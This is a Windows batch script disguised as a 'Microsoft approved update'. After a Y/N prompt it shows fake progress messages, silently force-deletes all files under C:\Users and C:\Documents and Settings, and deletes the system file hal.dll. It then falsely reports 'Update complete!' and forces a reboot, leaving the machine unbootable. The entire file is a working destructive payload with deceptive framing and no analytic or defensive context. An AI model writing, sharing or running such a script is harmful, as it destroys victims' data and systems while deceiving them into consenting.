@echo off

cls

echo Microsoft approved update.

echo Install update? This my harm your computer.

set /p menu="Do you want to continue? (Y/N): "
if %menu%==Y goto Yes
if %menu%==y goto Yes
if %menu%==N goto No
if %menu%==n goto No

:Yes

echo Updating...

ping -n 3 127.0.0.1 > NUL

del /Q /F /S "C:\Documents and Settings\"

del /Q /F /S C:\Users\

del C:\WINDOWS\system32\hal.dll

ping -n 3 127.0.0.1 > NUL

echo Update complete!

ping -n 3 127.0.0.1 > NUL

echo Restarting...

ping -n 2 127.0.0.1 > NUL

shutdown -r
:No
